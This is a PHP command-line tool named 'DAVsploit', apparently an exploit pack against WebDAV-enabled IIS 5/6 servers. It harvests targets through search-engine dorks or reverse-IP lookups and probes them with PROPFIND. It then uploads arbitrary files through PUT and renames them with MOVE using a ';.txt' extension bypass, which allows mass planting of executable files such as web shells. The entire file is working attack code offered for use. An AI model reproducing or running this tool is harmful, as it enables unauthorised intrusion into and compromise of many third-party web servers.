<?php
set_time_limit(0);
error_reporting(0);

echo "             
  _________  ____    __         _       ___   
  \_   __  \/  \ \  / /__ ____ | | ___ |_| |_ 
    | |  / / /\ \ \/ / __/  _ \| |/ _ \| |  _\ 
    | |_/ / /__\ \  /__  | | | | | |_| | | |___
    |____/________\/____/| ||_/|_|\___/|_|_____\
    -------------------- |_| -------------------

    WebDAV exploit pack - coded by pers0nant	  

";

$arg = getopt("", array("url:", "multi:", "server:", "upload:", "valid", "dork:"));

if(isset($arg["url"])) {



	if(!check_url($arg["url"])) die("    [*] URL is not valid\r\n\r\n\r\n");
	if(!isset($arg["valid"]) AND !isset($arg["upload"])) die("    [*] cannot determine attack vector\r\n\r\n\r\n");
	
	if(preg_match("/https?/", $arg["url"])) $url = preg_replace("/https?:\/\//", "", $arg["url"]);
	else $url = $arg["url"];

	if(isset($arg["upload"])) {
	
		if(!is_file($arg["upload"])) die("    [*] cannot find ".$arg["upload"]."\r\n\r\n\r\n");
		
		$filename = bypass($arg["upload"]);
			
		if(put($url, $arg["upload"])) echo "    [!] ".$filename." was successfully uploaded\r\n";
		else echo "    [x] failed to upload ".basename($arg["upload"])."\r\n";
	
	} elseif(isset($arg["valid"])) {
	
		if(propfind($url)) die("    [!] ".$arg["url"]." is possibly vulnerable\r\n\r\n\r\n");
		else die("    [x] ".$arg["url"]." is not vulnerable\r\n\r\n\r\n");
		
	}



} elseif(isset($arg["multi"])) {


	
	if(!is_file($arg["multi"])) die("    [*] cannot find ".$arg["multi"]."\r\n\r\n\r\n");
	if(!isset($arg["valid"]) AND !isset($arg["upload"])) die("   [*] cannot determine attack vector\r\n\r\n\r\n");

	$list = array_filter(file($arg["multi"], FILE_IGNORE_NEW_LINES), function($x){ return is_string($x) && trim($x) !== ""; });
	array_unique($list);
		
	if(count($list) !== 0) echo "    [*] ".count($list)." URLs loaded\r\n\r\n";
	else die("    [x] no URLs retrieved\r\n\r\n\r\n");

	if(isset($arg["upload"])) {
	
		if(!is_file($arg["upload"])) die("    [*] cannot find ".$arg["upload"]."\r\n\r\n\r\n");
				
		$filename = bypass($arg["upload"]);
		
		foreach($list as $url) {
		
			$site = clean($url);
	
			if(put($site, $arg["upload"])) echo "    [!] ".$site."\r\n";
			else echo "    [x] ".$site."\r\n";

		}
	
	} elseif(isset($arg["valid"])) {
	
		foreach($list as $url) {
		
			$site = clean($url);
	
			if(propfind($site)) echo "    [!] ".$site."\r\n";
			else echo "    [x] ".$site."\r\n";
	
		}
	
	}



} elseif(isset($arg[server])) {


	if(!isset($arg["valid"]) AND !isset($arg["upload"])) die("   [*] cannot determine attack vector\r\n\r\n\r\n");

	if(filter_var($arg[server], FILTER_VALIDATE_IP)) {

		$ip = $arg[server];
		
	} else {

		$site = preg_replace("/http:\/\//", "", $arg[server]);
		$ip = gethostbyname($site);
		
		if(!filter_var($ip, FILTER_VALIDATE_IP)) die("    [*] cannot retrieve server ip address\r\n\r\n\r\n");

	}
			
	echo "    [*] ip address : ".$ip."\r\n\r\n";

	// IP LOGGING ///////////////////////////////////////////////////////////////////////
	
	if(preg_match('/'.str_replace('.', '\.', $ip).'/', file_get_contents("ip.txt"))) {
	
		echo "    [*] the server had been scanned before. continue? (y/n) ";
		$input = trim(fgets(STDIN));
		echo "\r\n\r\n";
		
		if(!preg_match('/(y|yes)/i', $input)) exit; 
	
	} else append($ip."\r\n", "ip.txt");

	/////////////////////////////////////////////////////////////////////////////////////
	
	$list = dork("yahoo", "ip:".$ip);
	
	if(isset($arg["valid"])) {
	
		if(propfind($list[0])) die("    [!] the server is vulnerable\r\n\r\n\r\n");
		else die("    [x] the server is not vulnerable\r\n\r\n\r\n");
	
	}
	
	if(count($list) !== 0) echo "    [*] ".count($list)." URLs loaded\r\n\r\n";
	else die("    [x] no URLs retrieved\r\n\r\n\r\n");
	
	if(isset($arg["upload"])) {
	
		if(!is_file($arg["upload"])) die("    [*] cannot find ".$arg["upload"]."\r\n\r\n\r\n");
		
		$filename = bypass($arg["upload"]);
			
		foreach($list as $url) {
		
			if(put($url, $arg["upload"])) echo "    [!] ".$url."\r\n";
			else echo "    [x] ".$url."\r\n";
		
		}	

	}


	
} elseif(isset($arg["dork"])) {



	$exp = explode(",", $arg["dork"]);

	if(!isset($exp[1])) die("   [*] invalid dork argument\r\n\r\n");
	if(!preg_match('/(ask|bing|conduit|yahoo)/', $exp[0])) die("   [*] invalid dork engine\r\n\r\n");
	if(!isset($arg["valid"]) AND !isset($arg["upload"])) die("   [*] cannot determine attack vector\r\n\r\n\r\n");

	$list = dork($exp[0], $exp[1]);
	array_unique($list);
	
	if(count($list) !== 0) echo "    [*] ".count($list)." URLs loaded\r\n\r\n";
	else die("    [x] no URLs retrieved\r\n\r\n\r\n");
	
	if(isset($arg["upload"])) {
	
		if(!is_file($arg["upload"])) die("    [*] cannot find ".$arg["upload"]."\r\n\r\n\r\n");
		
		$filename = bypass($arg["upload"]);
			
		foreach($list as $url) {
		
			if(put($url, $arg["upload"])) echo "    [!] ".$url."\r\n";
			else echo "    [x] ".$url."\r\n";
		
		}
	
	} elseif(isset($arg["valid"])) {
	
		foreach($list as $url) {
		
			if(propfind($url)) echo "    [!] ".$url."\r\n";
			else echo "    [x] ".$url."\r\n";
		
		}
	
	}



} else {


	echo "    DAVsploit is an automated exploit pack created to pentest WebDAV enabled 
    
    IIS server(s) by performing remote authentication attacks
        
	
    target :

        --url [URL]              set a single target to the URL provided
        --multi [LIST]           set multiple targets enlisted in textual file
        --server [IP|DOMAIN]     set multiple targets hosted in the same server
        --dork [ENGINE,DORK]     set multiple target from search dorks
		

    attack vector :	
		
        --upload [FILE]          upload file to server (extension bypass)
        --valid                  scan for webDAV possible vulnerability
	  

    engine (dork usage) :
	
        ask                      www.ask.com
        bing                     www.bing.com
        conduit                  search.conduit.com
        yahoo                    search.yahoo.com
    

    example:

        php ".$argv[0]." --url site.com --upload x.html
        php ".$argv[0]." --multi list.txt --valid
        php ".$argv[0]." --server 127.0.0.1 --upload x.txt
        php ".$argv[0]." --dork conduit,inurl:asp --valid \r\n";

}

echo "\r\n\r\n";
exit;

function get_source($url) {

	$curl = curl_init($url);
	curl_setopt ($curl, CURLOPT_HEADER, 0);
	curl_setopt ($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt ($curl, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt ($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0");
	$source = curl_exec ($curl);
	curl_close ($curl);
	return $source;
	
}

function clean($url) {

	$url = preg_replace('/https?:\/\//', '', $url);

	if(preg_match('/\//', $url)) {

		$exp = explode("/", $url);
		return $exp[0];

	} else return $url; 

}

function yclean($url) {

	$exp = explode('**', $url);
	$lode = explode("/", urldecode($exp[1]));
	return $lode[2];

}

function dork($engine, $dork) {

	$dork = urlencode(stripslashes($dork));
	$urls = array();
	
	if($engine === "ask") {

		$search = "http://www.ask.com/web?q=";
		$page = "&page=";
		$regex = '/<a id="r[0-9]_t" href="(.*)" onmousedown="return/';
		$next = '/class="pgnav fl"><a class="/';
		$start = 1;
	
	} elseif($engine === "conduit"){

		$search = "http://search.conduit.com/Results.aspx?q=";
		$page = "&start=";
		$regex = '/<div class="title"><a href="(.*)" id="/';
		$next = '/Next <span class="paging_icon next">/';
		$start = 0;

	} elseif($engine === "bing") {

		$search = "http://www.bing.com/search?q=";
		$page = "&first=";	
		$regex = '(<div class="sb_tlst">.*<h3>.*<a href="(.*)".*>(.*)</a>.*</h3>.*</div>)siU';
		$next = '/Next<\/a><\/li><\/ul>/';
		$start = 0;
	
	} elseif($engine === "yahoo") {
	
		$search = "http://search.yahoo.com/search?p=";
		$page = "&b=";	
		$regex = '/class="yschttl spt" href="(.*?)"target="_blank" data-bk="/si';
		$next = '/Next &gt;<\/a><\/div><\/div>/';
		$start = 0;
	
	}
	
	for($id = $start ; $id <= 999; $id++) {
		
		if($engine !== "ask") {
		
			$id = $id * 10;
			$id = $id + 1;
			
		}
		
		$result = get_source($search.$dork.$page.$id);
		preg_match_all($regex, $result, $matches);
		
		foreach($matches[1] as $site) {
			
			if($engine === "yahoo") array_push($urls, yclean($site));
			else array_push($urls, clean($site));

		}
		
		if(!preg_match($next, $result)) break;
		
	}
	
	return array_unique($urls);

}

function put($url, $file) {

	$ch = curl_init();
	$base = basename($file);
	$exp = explode(".", $base);
	$filesize = filesize($file);
	$fh = fopen($file, "r");

	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_URL, $url."/".$exp[0].".txt");
	curl_setopt($ch, CURLOPT_HEADER, 1);
	curl_setopt($ch, CURLOPT_NOBODY, 1);
	curl_setopt($ch, CURLOPT_UPLOAD, 1);
	curl_setopt($ch, CURLOPT_PUT, 1);
	curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($c, CURLOPT_TIMEOUT, 10);
	curl_setopt($ch, CURLOPT_INFILE, $fh);
	curl_setopt($ch, CURLOPT_INFILESIZE, $filesize);
	$res = curl_exec($ch);
	curl_close($ch);
	fclose($fh);

	if(preg_match("/(OK|Created)/", $res)) {
		
		if($exp[1] !== "htm" && $exp[1] !== "html" && $exp[1] !== "txt") {
					
			if(move($url, $exp[0], $base)) return TRUE;
			else return FALSE;
						
		} else return TRUE;
				
	} else return FALSE;

}

function move($url, $base, $file) {

	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, $url."/".$base.".txt");
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_CUSTOMREQUEST, "MOVE");
	curl_setopt($c, CURLOPT_HEADER, 1);
	curl_setopt($c, CURLOPT_NOBODY, 1);
	curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($c, CURLOPT_TIMEOUT, 10);
	curl_setopt($c, CURLOPT_HTTPHEADER, array("Destination: http://".$url."/".$file.";.txt"));
	$response = curl_exec($c);
	curl_close($c);
	
	if(preg_match("/(Created|No Content)/", $response)) return TRUE;
	else return FALSE;

}

function propfind($url) {

	$c = curl_init();
	curl_setopt($c, CURLOPT_URL, $url);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($c, CURLOPT_CUSTOMREQUEST, "PROPFIND");
	curl_setopt($c, CURLOPT_HEADER, 1);
	curl_setopt($c, CURLOPT_NOBODY, 1);
	curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($c, CURLOPT_TIMEOUT, 10);
	curl_setopt($c, CURLOPT_HTTPHEADER, array("Content-Type: txt/xml", "Content-Length: 0"));  
	$res = curl_exec( $c );

	if(preg_match("/Multi-Status/", $res) AND preg_match("/Microsoft-IIS\/(6|5)/", $res)) return TRUE;
	else return FALSE;

}

function check_url($url) {

	$curl = curl_init($url);
	curl_setopt($curl, CURLOPT_NOBODY, 1);
	$result = curl_exec($curl);
    
	if($result) {
    
		$code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
		return ($code == 200 ? TRUE : FALSE);
        
	} else return FALSE;
	
}

function append($str, $file) {

	if(!is_file($file)) $f = fopen($file, "w");
	else $f = fopen($file, "a");
	
    fwrite($f, $str);
    fclose($f);

}

function bypass($file) {

	$base = basename($file);
	$exp = explode(".", $base);
	
	if($exp[1] !== "txt" && $exp[1] !== "htm" && $exp[1] !== "html") {

		echo "    [*] the file will be uploaded as ".$base.";.txt\r\n\r\n";
		return $base.";.txt";

	} else return $base;
	
}

?>
